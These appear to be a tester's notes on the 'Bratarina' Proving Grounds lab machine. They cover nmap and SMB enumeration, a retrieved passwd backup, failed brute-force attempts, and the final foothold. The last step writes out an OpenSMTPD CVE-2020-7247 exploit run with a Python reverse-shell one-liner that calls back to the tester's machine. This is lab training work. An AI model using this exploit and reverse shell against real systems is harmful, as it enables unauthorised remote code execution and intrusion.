---
tags: [ProvingGround]
---

Bratarina 6/2/2025

--------------------------

## 1. sudo nmap -p- -sC -sV -Pn -n --open 192.168.189.71 -oN nmap/initial
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 db:dd:2c:ea:2f:85:c5:89:bc:fc:e9:a3:38:f0:d7:50 (RSA)
|   256 e3:b7:65:c2:a7:8e:45:29:bb:62:ec:30:1a:eb:ed:6d (ECDSA)
|_  256 d5:5b:79:5b:ce:48:d8:57:46:db:59:4f:cd:45:5d:ef (ED25519)
25/tcp  open  smtp        OpenSMTPD
| smtp-commands: bratarina Hello nmap.scanme.org [192.168.45.235], pleased to meet you, 8BITMIME, ENHANCEDSTATUSCODES, SIZE 36700160, DSN, HELP
|_ 2.0.0 This is OpenSMTPD 2.0.0 To report bugs in the implementation, please contact bugs@openbsd.org 2.0.0 with full details 2.0.0 End of HELP info
80/tcp  open  http        nginx 1.14.0 (Ubuntu)
|_http-title:         Page not found - FlaskBB
|_http-server-header: nginx/1.14.0 (Ubuntu)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: COFFEECORP)
Service Info: Host: bratarina; OS: Linux; CPE: cpe:/o:linux:linux_kernel

## Host script results
| smb2-time:
|   date: 2025-06-02T20:37:52
|_  start_date: N/A
|_clock-skew: mean: 1h20m00s, deviation: 2h18m35s, median: 0s
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: bratarina
|   NetBIOS computer name: BRATARINA\x00
|   Domain name: \x00
|   FQDN: bratarina
|_  System time: 2025-06-02T16:37:50-04:00
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled but not required

## 2. SMTP Investigation.
- OpenSMTPD 2.0.0.
- Found possible exploit (CVE-2020-7247) EDB-ID: 47984.
- Tried a few exploits including MSF, no luck
## 3. Http Investigation
- Looks like FlashBB running.
- Tried a few exploits for FLashBB. No luck.
## 4. SMB Investigation.  nmap -script smb-* 192.168.116.71

| smb-ls: Volume \\192.168.116.71\backups
| SIZE   TIME                 FILENAME
| <DIR>  2020-07-06T07T:46:41  .
| <DIR>  2018-04-26T18:17:34  ..
| 1747   2020-07-06T07:46:41  passwd.bak

## 5. cat passwd.bak |grep /bin/bash
root:x:0:0:root:/root:/bin/bash
neil:x:1000:1000:neil,,,:/home/neil:/bin/bash
postgres:x:111:116:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash

## 6. Tried hydra with neil and postgres. No luck.

## 7. Went back to SMTP and used python reverse shell instead of bash and nc.

python3 47984.py 192.168.116.71 25 'python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.45.178\",80));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn(\"/bin/bash\")"'
